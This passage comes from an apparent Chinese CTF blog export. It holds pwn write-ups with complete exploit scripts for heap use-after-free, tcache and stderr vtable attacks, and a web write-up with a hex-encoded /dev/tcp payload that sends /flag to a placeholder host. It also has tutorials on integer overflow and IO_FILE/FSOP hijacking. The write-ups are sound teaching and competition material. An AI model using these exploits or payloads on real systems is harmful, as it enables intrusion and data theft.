payload3)sh.interactive() of这是一道堆题，题目有allocate, edit, show, delete几个功能。出题方从urandom读了一个8字节的随机数当做cookie，只有cookie正确才能做操作，free的时候把cookie清零。然而编译器(gcc和clang)都会把这个清0操作给优化掉，导致UAF。 题目分析讲真的，看师傅们的exp没看懂是怎么搞的，堆题之前也没刷过呢。。。 远程测试发现和源码不同，没有了cookie操作，直接改free_hook调用system即可。 from pwn import *context.log_level=\"debug\"def add(index): p.sendlineafter(\": \",\"1\") p.sendlineafter(\": \",str(index))def edit(index,note): p.sendlineafter(\": \",\"2\") p.sendlineafter(\"Index: \",str(index)) p.sendafter(\"Content: \",note)def show(index): p.sendlineafter(\": \",\"3\") p.sendlineafter(\"Index: \",str(index))def delete(index): p.sendlineafter(\": \",\"4\") p.sendlineafter(\": \",str(index))#p=remote(\"121.36.74.70\",9999)p=process(\"./5kjpwn2\")for i in range(9): add(i)for i in range(8): delete(i)show(7)p.recvuntil(\": \")libc=u64(p.recv(6)+\"\\x00\\x00\")-0x7ffff7dcfca0+0x7ffff79e4000print hex(libc)edit(6,p64(libc+0x003ed8e8))edit(0,\"/bin/sh\\x00\")add(10)add(11)edit(11,p64(libc+0x04f440))delete(0)p.interactive() pwnme一道heap题目，只不过环境变成了uclibc + arm，因为uclibc当中也加入了tcache的机制，所以可以通过tcache机制对heap上的地址进行泄露，然后在edit函数当中能够溢出任意大小的字节。因此可以修改堆后面的数据，通过tcache attack，劫持程序的控制流就能够进行ROP，最后获得程序的控制权。 arm架构程序的调试需要有qemu的环境，然后按照如下步骤启动终端进行调试： sudo mv ld-uClibc-1.0.34.so ld-uClibc.so.0sudo mv ld-uClibc.so.0 /lib/sudo mv libuClibc-1.0.34.so libc.so.0sudo mv libc.so.0 /lib/ 之后执行如下命令即可运行程序 qemu-arm -L ./lib ./a.out 按照下面的操作可进行调试： qemu-arm -g 1234 -L ./lib ./a.out 然后另开一个终端 gdb-multiarch ./a.out -qpwndbg&gt; target remote localhost:1234 即可调试。 expfrom pwn import *import syscontext.log_level=\"debug\"def show(): p.sendlineafter(\"&gt;&gt;&gt; \",\"1\")def add(l,note): p.sendlineafter(\"&gt;&gt;&gt; \",\"2\") p.sendlineafter(\":\",str(l)) p.sendafter(\":\",note)def change(index,l,note): p.sendlineafter(\"&gt;&gt;&gt; \",\"3\") p.sendlineafter(\":\",str(index)) p.sendlineafter(\":\",str(l)) p.sendafter(\":\",note)def remove(index): p.sendlineafter(\"&gt;&gt;&gt; \",\"4\") p.sendlineafter(\":\",str(index))if len(sys.argv)==1: #p=process([\"qemu-arm\",\"-g\",\"1234\",\"-L\",\"./\",\"./a.out\"]) p=remote(\"121.36.58.215\",1337)else: p=process([\"qemu-arm\",\"-L\",\"./\",\"./a.out\"])add(0x18,\"aaaaaaaa\")add(0x4f8,\"aaaaaaaa\")add(0x18,\"aaaaaaaa\")add(0x18,\"aaaaaaaa\")change(0,0x40,\"a\"*0x1c+p64(0x500+0x20+1))remove(1)add(0x4f8,\"aaaaaaaa\")show()p.recvuntil(\"2 : \")libc=u32(p.recv(4))+0xff720000-0xff7ba8ecprint hex(libc)add(0x18,\"aaaaaaa\")add(0x21,\"aaaaaaa\")remove(0)remove(4)change(2,8,p32(0x21048^0x22))add(0x18,\"aaaaa\")add(0x18,\"aaaaa\")change(4,0xf8,\"/bin/sh\\x00\"+p32(0)*4+p32(0x28)+p32(0x21038))change(0,0x8,p32(libc+0x51800))#show()remove(4)p.interactive()","link":"/2020/06/26/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4pwn%E9%A2%98%E7%BB%83%E4%B9%A0/"},{"title":"DASCTF六月月赛","text":"想做PWN来着，结果0解，划水几道题。。。 简单的计算题源码： #!/usr/bin/env python3 # -*- coding: utf-8 -*- from flask import Flask, render_template, request,session from config import create import os app = Flask(__name__) app.config['SECRET_KEY'] = os.urandom(24) ## flag is in /flag try to get it @app.route('/', methods=['GET', 'POST']) def filter(string): for black_word in black_list: if black_word in string: return \"hack\" return string if request.method == 'POST': input = request.form['input'] create_question = create() input_question = session.get('question') session['question'] = create_question if input_question==None: return render_template('index.html', answer=\"Invalid session please try again!\", question=create_question) if filter(input)==\"hack\": return render_template('index.html', answer=\"hack\", question=create_question) try: calc_result = str((eval(input_question + \"=\" + str(input)))) if calc_result == 'True': result = \"Congratulations\" elif calc_result == 'False': result = \"Error\" else: result = \"Invalid\" except: result = \"Invalid\" return render_template('index.html', answer=result,question=create_question) if request.method == 'GET': create_question = create() session['question'] = create_question return render_template('index.html',question=create_question) @app.route('/source') def source(): return open(\"app.py\", \"r\").read() if __name__ == '__main__': app.run(host=\"0.0.0.0\", debug=False) 反弹shell，起初黑名单只有or，用下面payload即可： os.system('bash -c \\\"cat /flag &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1\\\"') 改了之后os、import、system都被ban了，只能编码绕过，这里采用hex编码，先对上面的payload转为hex： 6f732e73797374656d282762617368202d63205c22636174202f666c6167203e26202f6465762f7463702f69702f706f727420303e26315c222729 然后利用bytes.fromhex()函数转换 bytes对象的hex函数，用来将bytes对象的值转换成hexstr；而fromhex函数，用来将hexstr导入bytes对象，相当于用hexstr来创建bytes对象。 &gt;&gt;&gt; bytes([0,1,2,3,4,5]).hex()'000102030405'&gt;&gt;&gt; bytes.fromhex('000102030405')b'\\x00\\x01\\x02\\x03\\x04\\x05'&gt;&gt;&gt; b'abcde'.hex()'6162636465'&gt;&gt;&gt; a = bytes.fromhex('6162636465')&gt;&gt;&gt; ab'abcde' 结合exec()函数即可执行反弹shell： exec(bytes.fromhex('6f732e73797374656d282762617368202d63205c22636174202f666c6167203e26202f6465762f7463702f69702f706f727420303e26315c222729')) secret本题运行时输出了printf函数的地址，并且开启了canary，原本以为可以通过它泄露canary，然后再次溢出拿shell的，可是尝试之后是无法覆盖canary的低字节从而将其泄露。看到师傅们的wp得知是_IO_FILE的题，伪造 vtable 劫持程序流程。 题目分析先看看远程的libc是什么版本，根据 printf 的地址，查到多个，最后确定了是 libc2.29 libc2.29中的vtablelibc2.29 貌似不能修改 vtable 的内容，而且对 vtable 指针有要求，但是 vtable 指针附近偏差不大的地方都没什么问题，而且可写。 那么就修改 __IO_2_1_stderr 的 vtable 指针的低两字节（只要和原来的位置偏差不大，而且可写就行，需要爆破)，然后往新的指针指向的地址写 3 个 qword，第三个刚好就是 io_finish 的位置，填上one_gadget 即可。 vtable 函数 指针： /* The 'finish' function does any final cleaning up of an _IO_FILE object. It does not delete (free) it, but does everything else to finalize it. It matches the streambuf::~streambuf virtual destructor. */typedef void (*_IO_finish_t) (FILE *, int); /* finalize */#define _IO_FINISH(FP) JUMP1 (__finish, FP, 0)#define _IO_WFINISH(FP) WJUMP1 (__finish, FP, 0)struct _IO_jump_t{ JUMP_FIELD(size_t, __dummy); JUMP_FIELD(size_t, __dummy2); JUMP_FIELD(_IO_finish_t, __finish); JUMP_FIELD(_IO_overflow_t, __overflow); JUMP_FIELD(_IO_underflow_t, __underflow); JUMP_FIELD(_IO_underflow_t, __uflow); JUMP_FIELD(_IO_pbackfail_t, __pbackfail); /* showmany */ JUMP_FIELD(_IO_xsputn_t, __xsputn); JUMP_FIELD(_IO_xsgetn_t, __xsgetn); JUMP_FIELD(_IO_seekoff_t, __seekoff); JUMP_FIELD(_IO_seekpos_t, __seekpos); JUMP_FIELD(_IO_setbuf_t, __setbuf); JUMP_FIELD(_IO_sync_t, __sync); JUMP_FIELD(_IO_doallocate_t, __doallocate); JUMP_FIELD(_IO_read_t, __read); JUMP_FIELD(_IO_write_t, __write); JUMP_FIELD(_IO_seek_t, __seek); JUMP_FIELD(_IO_close_t, __close); JUMP_FIELD(_IO_stat_t, __stat); JUMP_FIELD(_IO_showmanyc_t, __showmanyc); JUMP_FIELD(_IO_imbue_t, __imbue);}; 对于攻击的vtable 函数 指针其中的： __finish__ __close 其执行顺序是先close，然后finish。由于程序给的是0x18字节的任意写，攻击 __finish__就可以了。 vtable的值，以及其对应的函数指针，在glibc 2.29下是可写的。这个是很重要的一点，本来个人不知道这个，想了好久其他的办法来利用。 在glibc 2.23以及glibc 2.27其都是不可写的。 攻击思路利用程序的最后一次任意地址写，直接把__IO_2_1_stderr上的vtable__finish__指针修改为one gadget。 exp参考大佬的脚本： #coding=utf8'''脚本使用的库为welpwn(github可搜)'''from PwnContext import * context.terminal = ['gnome-terminal', '-x', 'sh', '-c']context.log_level = 'debug'# functions for quick scripts = lambda data :ctx.send(str(data)) #in case that data is an intsa = lambda delim,data :ctx.sendafter(str(delim), str(data)) sl = lambda data :ctx.sendline(str(data)) sla = lambda delim,data :ctx.sendlineafter(str(delim), str(data)) r = lambda numb=4096,timeout=2:ctx.recv(numb, timeout=timeout)ru = lambda delims, drop=True :ctx.recvuntil(delims, drop)irt = lambda :ctx.interactive()rs = lambda *args, **kwargs :ctx.start(*args, **kwargs)dbg = lambda gs='', **kwargs :ctx.debug(gdbscript=gs, **kwargs)# misc functionsuu32 = lambda data :u32(data.ljust(4, '\\x00'))uu64 = lambda data :u64(data.ljust(8, '\\x00'))leak = lambda name,addr :log.success('{} = {:#x}'.format(name, addr))ctx.binary = './secret'ctx.remote = ('183.129.189.60', 10030)ctx.remote_libc = './libc.so' # libc-2.29ctx.debug_remote_libc = True#rs()rs('remote')ru('secret:')printf = int(ru('\\n', drop=True), 16)leak('printf', printf)lbase = printf - ctx.libc.sym['printf']leak('lbase', lbase)_IO_2_1_stderr_ = lbase + ctx.libc.sym['_IO_2_1_stderr_']vtable = _IO_2_1_stderr_ + 0xd8leak('_IO_2_1_stderr_', _IO_2_1_stderr_)leak('vtable', vtable)one1 = lbase + 0xe237fone2 = lbase + 0xe2383one3 = lbase + 0xe2386one4 = lbase + 0x106ef8s(p64(vtable))s('\\xf0\\x70') # 修改vtable地址低两字节 s(p64(0) + p64(0) + p64(one3))irt()","link":"/2020/06/25/DASCTF%E5%85%AD%E6%9C%88%E6%9C%88%E8%B5%9B/"},{"title":"整形溢出基础","text":"C 语言中，整数的基本数据类型分为短整型 (short)，整型 (int)，长整型 (long)，这三个数据类型还分为有符号和无符号，每种数据类型都有各自的大小范围（数据类型的大小范围是编译器决定），当程序中的数据超过其数据类型的范围，则会造成溢出，整数类型的溢出被称为整数溢出。 整数的表示范围以及字节数如下表： 溢出原理整型溢出主要分为上界溢出和下界溢出，下面分别进行介绍。 上界溢出先看代码： # 伪代码short int a;a = a + 1;# 对应的汇编movzx eax, word ptr [rbp - 0x1c]add eax, 1mov word ptr [rbp - 0x1c], axunsigned short int b;b = b + 1;# assembly codeadd word ptr [rbp - 0x1a], 1 上界溢出有两种情况，一种是 0x7fff + 1， 另一种是 0xffff + 1。 因为计算机底层指令是不区分有符号和无符号的，数据都是以二进制形式存在 (编译器的层面才对有符号和无符号进行区分，产生不同的汇编指令)。 所以 add 0x7fff, 1 == 0x8000，这种上界溢出对无符号整型就没有影响，但是在有符号短整型中，0x7fff 表示的是 32767，但是 0x8000 表示的是 -32768，用数学表达式来表示就是在有符号短整型中 32767+1 == -32768。 第二种情况是 add 0xffff, 1，这种情况需要考虑的是第一个操作数。 比如上面的有符号型加法的汇编代码是 add eax, 1，因为 eax=0xffff，所以 add eax, 1 == 0x10000，但是无符号的汇编代码是对内存进行加法运算 add word ptr [rbp - 0x1a], 1 == 0x0000。 在有符号的加法中，虽然 eax 的结果为 0x10000，但是只把 ax=0x0000 的值储存到了内存中，从结果看和无符号是一样的。 再从数字层面看看这种溢出的结果，在有符号短整型中，0xffff==-1，-1 + 1 == 0，从有符号看这种计算没问题。 但是在无符号短整型中，0xffff == 65535, 65535 + 1 == 0。 下界溢出下届溢出的道理和上界溢出一样，在汇编代码中，只是把 add 替换成了 sub。 一样也是有两种情况： 第一种是 sub 0x0000, 1 == 0xffff，对于有符号来说 0 - 1 == -1 没问题，但是对于无符号来说就成了 0 - 1 == 65535。 第二种是 sub 0x8000, 1 == 0x7fff，对于无符号来说是 32768 - 1 == 32767 是正确的，但是对于有符号来说就变成了 -32768 - 1 = 32767。 典例常见的整型溢出可以总结为两种情况 未限制范围这种漏洞由于对用户输入的数值未进行过滤检查而导致，例子如下： $ cat test.c#include&lt;stddef.h&gt;int main(void){ int len; int data_len; int header_len; char *buf; header_len = 0x10; scanf(\"%uld\", &amp;data_len); len = data_len+header_len buf = malloc(len); read(0, buf, data_len); return 0;}$ gcc test.c$ ./a.out-1asdfasfasdfasdfafasfasfasdfasdf# gdb a.out► 0x40066d &lt;main+71&gt; call malloc@plt &lt;0x400500&gt; size: 0xf 只申请 0x20 大小的堆，但是却能输入 0xffffffff 长度的数据，从整型溢出到堆溢出。 错误的类型转换即使正确的对变量进行约束，也仍然有可能出现整数溢出漏洞，我认为可以概括为错误的类型转换，如果继续细分下去，可以分为： 1、范围大的变量赋值给范围小的变量 $ cat test2.cvoid check(int n){ if (!n) printf(\"vuln\"); else printf(\"OK\");}int main(void){ long int a; scanf(\"%ld\", &amp;a); if (a == 0) printf(\"Bad\"); else check(a); return 0;}$ gcc test2.c$ ./a.out4294967296vuln 上述代码就是一个范围大的变量 (长整型 a)，传入 check 函数后变为范围小的变量 (整型变量 n)，造成整数溢出的例子。 已知长整型的占有 8 byte 的内存空间，而整型只有 4 byte 的内存空间，所以当 long -&gt; int，将会造成截断，只把长整型的低 4byte 的值传给整型变量。 在上述例子中，就是把 long: 0x100000000 -&gt; int: 0x00000000。 但是当范围更小的变量就能完全的把值传递给范围更大的变量，而不会造成数据丢失。 2、只做了单边限制 这种情况只针对有符号类型： $ cat test3.cint main(void){ int len, l; char buf[11]; scanf(\"%d\", &amp;len); if (len &lt; 10) { l = read(0, buf, len); *(buf+l) = 0; puts(buf); } else printf(\"Please len &lt; 10\"); }$ gcc test3.c$ ./a.out-1aaaaaaaaaaaaaaaaaaaaaaaa 从表面上看，我们对变量 len 进行了限制，但是仔细思考可以发现，len 是有符号整型，所以 len 的长度可以为负数，但是在 read 函数中，第三个参数的类型是 size_t，该类型相当于 unsigned long int，属于无符号长整型 上面举例的两种情况都有一个共性，就是函数的形参和实参的类型不同，所以我认为可以总结为错误的类型转换。","link":"/2020/06/17/%E6%95%B4%E5%BD%A2%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/"},{"title":"IO-FILE相关","text":"FILE 在 Linux 系统的标准 IO 库中是用于描述文件的结构，称为文件流。 FILE 结构在程序执行 fopen 等函数时会进行创建，并分配在堆中。 FILE结构定义一个指向 FILE 结构的指针来接收这个返回值。FILE 结构定义在 libio.h 中，如下所示 struct _IO_FILE { int _flags; /* High-order word is _IO_MAGIC; rest is flags. */#define _IO_file_flags _flags /* The following pointers correspond to the C++ streambuf protocol. */ /* Note: Tk uses the _IO_read_ptr and _IO_read_end fields directly. */ char* _IO_read_ptr; /* Current read pointer */ char* _IO_read_end; /* End of get area. */ char* _IO_read_base; /* Start of putback+get area. */ char* _IO_write_base; /* Start of put area. */ char* _IO_write_ptr; /* Current put pointer. */ char* _IO_write_end; /* End of put area. */ char* _IO_buf_base; /* Start of reserve area. */ char* _IO_buf_end; /* End of reserve area. */ /* The following fields are used to support backing up and undo. */ char *_IO_save_base; /* Pointer to start of non-current get area. */ char *_IO_backup_base; /* Pointer to first valid character of backup area */ char *_IO_save_end; /* Pointer to end of non-current get area. */ struct _IO_marker *_markers; struct _IO_FILE *_chain; int _fileno;#if 0 int _blksize;#else int _flags2;#endif _IO_off_t _old_offset; /* This used to be _offset but it's too small. */#define __HAVE_COLUMN /* temporary */ /* 1+column number of pbase(); 0 is unknown. */ unsigned short _cur_column; signed char _vtable_offset; char _shortbuf[1]; /* char* _save_gptr; char* _save_egptr; */ _IO_lock_t *_lock;#ifdef _IO_USE_OLD_IO_FILE}; 进程中的 FILE 结构会通过_chain 域彼此连接形成一个链表，链表头部用全局变量_IO_list_all 表示，通过这个值我们可以遍历所有的 FILE 结构。 在标准 I/O 库中，每个程序启动时有三个文件流是自动打开的：stdin、stdout、stderr。因此在初始状态下，_IO_list_all 指向了一个有这些文件流构成的链表，但是需要注意的是这三个文件流位于 libc.so 的数据段。而我们使用 fopen 创建的文件流是分配在堆内存上的。 我们可以在 libc.so 中找到 stdin\\stdout\\stderr 等符号，这些符号是指向 FILE 结构的指针，真正结构的符号是： _IO_2_1_stderr__IO_2_1_stdout__IO_2_1_stdin_ 但是事实上_IO_FILE 结构外包裹着另一种结构_IO_FILE_plus，其中包含了一个重要的指针 vtable 指向了一系列函数指针。 在 libc2.23 版本下，32 位的 vtable 偏移为 0x94，64 位偏移为 0xd8 struct _IO_FILE_plus{ _IO_FILE file; IO_jump_t *vtable;} vtable 是 IO_jump_t 类型的指针，IO_jump_t 中保存了一些函数指针，在后面我们会看到在一系列标准 IO 函数中会调用这些函数指针： void * funcs[] = { 1 NULL, // \"extra word\" 2 NULL, // DUMMY 3 exit, // finish 4 NULL, // overflow 5 NULL, // underflow 6 NULL, // uflow 7 NULL, // pbackfail 8 NULL, // xsputn #printf 9 NULL, // xsgetn 10 NULL, // seekoff 11 NULL, // seekpos 12 NULL, // setbuf 13 NULL, // sync 14 NULL, // doallocate 15 NULL, // read 16 NULL, // write 17 NULL, // seek 18 pwn, // close 19 NULL, // stat 20 NULL, // showmanyc 21 NULL, // imbue}; 相关函数freadfread 是标准 IO 库函数，作用是从文件流中读数据，函数原型如下： size_t fread ( void *buffer, size_t size, size_t count, FILE *stream) ; buffer 存放读取数据的缓冲区。 size：指定每个记录的长度。 count： 指定记录的个数。 stream：目标文件流。 返回值：返回读取到数据缓冲区中的记录个数 fread 的代码位于 / libio/iofread.c 中，函数名为\\_IO_fread，但真正的功能实现在子函数_IO_sgetn 中。 _IO_size_t_IO_fread (buf, size, count, fp) void *buf; _IO_size_t size; _IO_size_t count; _IO_FILE *fp;{ ... bytes_read = _IO_sgetn (fp, (char *) buf, bytes_requested); ...} 在\\_IO_sgetn 函数中会调用\\_IO_XSGETN，而\\_IO_XSGETN 是_IO_FILE_plus.vtable 中的函数指针，在调用这个函数时会首先取出 vtable 中的指针然后再进行调用。 _IO_size_t_IO_sgetn (fp, data, n) _IO_FILE *fp; void *data; _IO_size_t n;{ return _IO_XSGETN (fp, data, n);} 在默认情况下函数指针是指向_IO_file_xsgetn 函数的 if (fp-&gt;_IO_buf_base &amp;&amp; want &lt; (size_t) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base)) { if (__underflow (fp) == EOF) break; continue; } fwritefwrite 同样是标准 IO 库函数，作用是向文件流写入数据，函数原型如下 size_t fwrite(const void* buffer, size_t size, size_t count, FILE* stream); buffer: 是一个指针，对 fwrite 来说，是要写入数据的地址; size: 要写入内容的单字节数; count: 要进行写入 size 字节的数据项的个数; stream: 目标文件指针; 返回值：实际写入的数据项个数 count。 fwrite 的代码位于 /libio/iofwrite.c 中，函数名为\\_IO_fwrite。 在_IO_fwrite 中主要是调用_IO_XSPUTN 来实现写入的功能。 根据前面对\\_IO_FILE_plus 的介绍，可知\\_IO_XSPUTN 位于_IO_FILE_plus 的 vtable 中，调用这个函数需要首先取出 vtable 中的指针，再跳过去进行调用。 written = _IO_sputn (fp, (const char *) buf, request); 在\\_IO_XSPUTN 对应的默认函数\\_IO_new_file_xsputn 中会调用同样位于 vtable 中的_IO_OVERFLOW /* Next flush the (full) buffer. */ if (_IO_OVERFLOW (f, EOF) == EOF) \\_IO_OVERFLOW 默认对应的函数是_IO_new_file_overflow if (ch == EOF) return _IO_do_write (f, f-&gt;_IO_write_base, f-&gt;_IO_write_ptr - f-&gt;_IO_write_base); if (f-&gt;_IO_write_ptr == f-&gt;_IO_buf_end ) /* Buffer is really full */ if (_IO_do_flush (f) == EOF) return EOF; 在_IO_new_file_overflow 内部最终会调用系统接口 write 函数。 fopenfopen 在标准 IO 库中用于打开文件，函数原型如下 FILE *fopen(char *filename, *type); filename: 目标文件的路径 type: 打开方式的类型 返回值: 返回一个文件指针 在 fopen 内部会创建 FILE 结构并进行一些初始化操作，下面来看一下这个过程 首先在 fopen 对应的函数_fopen_internal 内部会调用 malloc 函数，分配 FILE 结构的空间。因此我们可以获知 FILE 结构是存储在堆上的 *new_f = (struct locked_FILE *) malloc (sizeof (struct locked_FILE)); 之后会为创建的 FILE 初始化 vtable，并调用_IO_file_init 进一步初始化操作 _IO_JUMPS (&amp;new_f-&gt;fp) = &amp;_IO_file_jumps;_IO_file_init (&amp;new_f-&gt;fp); 在_IO_file_init 函数的初始化操作中，会调用_IO_link_in 把新分配的 FILE 链入_IO_list_all 为起始的 FILE 链表中 void_IO_link_in (fp) struct _IO_FILE_plus *fp;{ if ((fp-&gt;file._flags &amp; _IO_LINKED) == 0) { fp-&gt;file._flags |= _IO_LINKED; fp-&gt;file._chain = (_IO_FILE *) _IO_list_all; _IO_list_all = fp; ++_IO_list_all_stamp; }} 之后_fopen_internal 函数会调用_IO_file_fopen 函数打开目标文件，_IO_file_fopen 会根据用户传入的打开模式进行打开操作，总之最后会调用到系统接口 open 函数，这里不再深入。 if (_IO_file_fopen ((_IO_FILE *) new_f, filename, mode, is32) != NULL) return __fopen_maybe_mmap (&amp;new_f-&gt;fp.file); 总结一下 fopen 的操作是 使用 malloc 分配 FILE 结构 设置 FILE 结构的 vtable 初始化分配的 FILE 结构 将初始化的 FILE 结构链入 FILE 结构链表中 调用系统调用打开文件 fclosefclose 是标准 IO 库中用于关闭已打开文件的函数，其作用与 fopen 相反。 int fclose(FILE *stream) 功能：关闭一个文件流，使用 fclose 就可以把缓冲区内最后剩余的数据输出到磁盘文件中，并释放文件指针和有关的缓冲区 fclose 首先会调用_IO_unlink_it 将指定的 FILE 从_chain 链表中脱链 if (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF) _IO_un_link ((struct _IO_FILE_plus *) fp); 之后会调用_IO_file_close_it 函数，_IO_file_close_it 会调用系统接口 close 关闭文件 if (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF) status = _IO_file_close_it (fp); 最后调用 vtable 中的_IO_FINISH，其对应的是_IO_file_finish 函数，其中会调用 free 函数释放之前分配的 FILE 结构 _IO_FINISH (fp); printf/putsprintf 和 puts 是常用的输出函数，在 printf 的参数是以\\n结束的纯字符串时，printf 会被优化为 puts 函数并去除换行符。 puts 在源码中实现的函数是_IO_puts，这个函数的操作与 fwrite 的流程大致相同，函数内部同样会调用 vtable 中的_IO_sputn，结果会执行_IO_new_file_xsputn，最后会调用到系统接口 write 函数。 printf 的调用栈回溯如下，同样是通过_IO_file_xsputn 实现 vfprintf+11_IO_file_xsputn_IO_file_overflowfunlockfile_IO_file_writewrite 下面记录一些攻击技术。 伪造 vtable 劫持程序流程简介前面我们介绍了 Linux 中文件流的特性（FILE），我们可以得知 Linux 中的一些常见的 IO 操作函数都需要经过 FILE 结构进行处理。尤其是_IO_FILE_plus 结构中存在 vtable，一些函数会取出 vtable 中的指针进行调用。 因此伪造 vtable 劫持程序流程的中心思想就是针对_IO_FILE_plus 的 vtable 动手脚，通过把 vtable 指向我们控制的内存，并在其中布置函数指针来实现。 因此 vtable 劫持分为两种，一种是直接改写 vtable 中的函数指针，通过任意地址写就可以实现。另一种是覆盖 vtable 的指针指向我们控制的内存，然后在其中布置函数指针。 示例这里演示了修改 vtable 中的指针，首先需要知道_IO_FILE_plus 位于哪里，对于 fopen 的情况是位于堆内存，对于 stdin\\stdout\\stderr 是位于 libc.so 中。 int main(void){ FILE *fp; long long *vtable_ptr; fp=fopen(\"123.txt\",\"rw\"); vtable_ptr=*(long long*)((long long)fp+0xd8); //get vtable vtable_ptr[7]=0x41414141 //xsputn printf(\"call 0x41414141\");} 根据 vtable 在_IO_FILE_plus 的偏移得到 vtable 的地址，在 64 位系统下偏移是 0xd8。之后需要搞清楚欲劫持的 IO 函数会调用 vtable 中的哪个函数。关于 IO 函数调用 vtable 的情况已经在 FILE 结构介绍一节给出了，知道了 printf 会调用 vtable 中的 xsputn，并且 xsputn 是 vtable 中的第八项之后就可以写入这个指针进行劫持。 并且在 xsputn 等 vtable 函数进行调用时，传入的第一个参数其实是对应的_IO_FILE_plus 地址。比如这例子调用 printf，传递给 vtable 的第一个参数就是_IO_2_1_stdout_的地址。 利用这点可以实现给劫持的 vtable 函数传參，比如： #define system_ptr 0x7ffff7a52390;int main(void){ FILE *fp; long long *vtable_ptr; fp=fopen(\"123.txt\",\"rw\"); vtable_ptr=*(long long*)((long long)fp+0xd8); //get vtable memcopy(fp,\"sh\",3); vtable_ptr[7]=system_ptr //xsputn fwrite(\"hi\",2,1,fp);} 但是在目前 libc2.23 版本下，位于 libc 数据段的 vtable 是不可以进行写入的。不过，通过在可控的内存中伪造 vtable 的方法依然可以实现利用。 #define system_ptr 0x7ffff7a52390;int main(void){ FILE *fp; long long *vtable_addr,*fake_vtable; fp=fopen(\"123.txt\",\"rw\"); fake_vtable=malloc(0x40); vtable_addr=(long long *)((long long)fp+0xd8); //vtable offset vtable_addr[0]=(long long)fake_vtable; memcpy(fp,\"sh\",3); fake_vtable[7]=system_ptr; //xsputn fwrite(\"hi\",2,1,fp);} 我们首先分配一款内存来存放伪造的 vtable，之后修改_IO_FILE_plus 的 vtable 指针指向这块内存。因为 vtable 中的指针我们放置的是 system 函数的地址，因此需要传递参数 “/bin/sh” 或 “sh”。 因为 vtable 中的函数调用时会把对应的_IO_FILE_plus 指针作为第一个参数传递，因此这里我们把 “sh” 写入_IO_FILE_plus 头部。之后对 fwrite 的调用就会经过我们伪造的 vtable 执行 system(“sh”)。 同样，如果程序中不存在 fopen 等函数创建的_IO_FILE 时，也可以选择 stdin\\stdout\\stderr 等位于 libc.so 中的_IO_FILE，这些流在 printf\\scanf 等函数中就会被使用到。在 libc2.23 之前，这些 vtable 是可以写入并且不存在其他检测的。 print &amp;_IO_2_1_stdin_$2 = (struct _IO_FILE_plus *) 0x7ffff7dd18e0 &lt;_IO_2_1_stdin_&gt;0x00007ffff7a0d000 0x00007ffff7bcd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7bcd000 0x00007ffff7dcd000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dcd000 0x00007ffff7dd1000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dd1000 0x00007ffff7dd3000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so FSOP简介FSOP 是 File Stream Oriented Programming 的缩写，根据前面对 FILE 的介绍得知进程内所有的_IO_FILE 结构会使用_chain 域相互连接形成一个链表，这个链表的头部由_IO_list_all 维护。 FSOP 的核心思想就是劫持_IO_list_all 的值来伪造链表和其中的_IO_FILE 项，但是单纯的伪造只是构造了数据还需要某种方法进行触发。FSOP 选择的触发方法是调用_IO_flush_all_lockp，这个函数会刷新_IO_list_all 链表中所有项的文件流，相当于对每个 FILE 调用 fflush，也对应着会调用_IO_FILE_plus.vtable 中的_IO_overflow。 int_IO_flush_all_lockp (int do_lock){ ... fp = (_IO_FILE *) _IO_list_all; while (fp != NULL) { ... if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)) &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF) { result = EOF; } ... }} 而_IO_flush_all_lockp 不需要攻击者手动调用，在一些情况下这个函数会被系统调用： 1、当 libc 执行 abort 流程时 2、当执行 exit 函数时 3、当执行流从 main 函数返回时 示例梳理一下 FSOP 利用的条件，首先需要攻击者获知 libc.so 基址，因为_IO_list_all 是作为全局变量储存在 libc.so 中的，不泄漏 libc 基址就不能改写_IO_list_all。 之后需要用任意地址写把_IO_list_all 的内容改为指向我们可控内存的指针， 之后的问题是在可控内存中布置什么数据，毫无疑问的是需要布置一个我们理想函数的 vtable 指针。但是为了能够让我们构造的 fake_FILE 能够正常工作，还需要布置一些其他数据。 这里的依据是我们前面给出的 if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)) &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF) { result = EOF; } 也就是： fp-&gt;_mode &lt;= 0 fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base 在这里通过一个示例来验证这一点，首先我们分配一块内存用于存放伪造的 vtable 和_IO_FILE_plus。 为了绕过验证，我们提前获得了_IO_write_ptr、_IO_write_base、_mode 等数据域的偏移，这样可以在伪造的 vtable 中构造相应的数据 #define _IO_list_all 0x7ffff7dd2520#define mode_offset 0xc0#define writeptr_offset 0x28#define writebase_offset 0x20#define vtable_offset 0xd8int main(void){ void *ptr; long long *list_all_ptr; ptr=malloc(0x200); *(long long*)((long long)ptr+mode_offset)=0x0; *(long long*)((long long)ptr+writeptr_offset)=0x1; *(long long*)((long long)ptr+writebase_offset)=0x0; *(long long*)((long long)ptr+vtable_offset)=((long long)ptr+0x100); *(long long*)((long long)ptr+0x100+24)=0x41414141; list_all_ptr=(long long *)_IO_list_all; list_all_ptr[0]=ptr; exit(0);} 我们使用分配内存的前 0x100 个字节作为_IO_FILE，后 0x100 个字节作为 vtable，在 vtable 中使用 0x41414141 这个地址作为伪造的_IO_overflow 指针。 之后，覆盖位于 libc 中的全局变量 _IO_list_all，把它指向我们伪造的_IO_FILE_plus。 通过调用 exit 函数，程序会执行 _IO_flush_all_lockp，经过 fflush 获取_IO_list_all 的值并取出作为_IO_FILE_plus 调用其中的_IO_overflow ---&gt; call _IO_overflow[#0] 0x7ffff7a89193 → Name: _IO_flush_all_lockp(do_lock=0x0)[#1] 0x7ffff7a8932a → Name: _IO_cleanup()[#2] 0x7ffff7a46f9b → Name: __run_exit_handlers(status=0x0, listp=&lt;optimized out&gt;, run_list_atexit=0x1)[#3] 